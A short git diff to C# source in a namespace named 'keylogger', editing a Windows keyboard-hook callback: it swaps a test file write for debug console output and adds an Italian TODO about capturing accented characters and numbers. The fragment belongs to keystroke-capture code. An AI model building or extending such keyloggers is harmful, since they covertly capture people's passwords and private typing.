@@ -35,7 +35,12 @@ namespace keylogger
 
         public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
-            File.AppendAllText("prova.txt", "ciaone");
+            //TODO 
+            /*  capire come stracazzo risolvere il problema di accenti e numeri
+             *  recuperando ascii o recuperando il valore e non il nome del tasto premuto
+             */
+            Console.WriteLine($"{wParam} - {(IntPtr)wParam}");
+            Console.Write($"{wParam}, {lParam}, {nCode}");
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
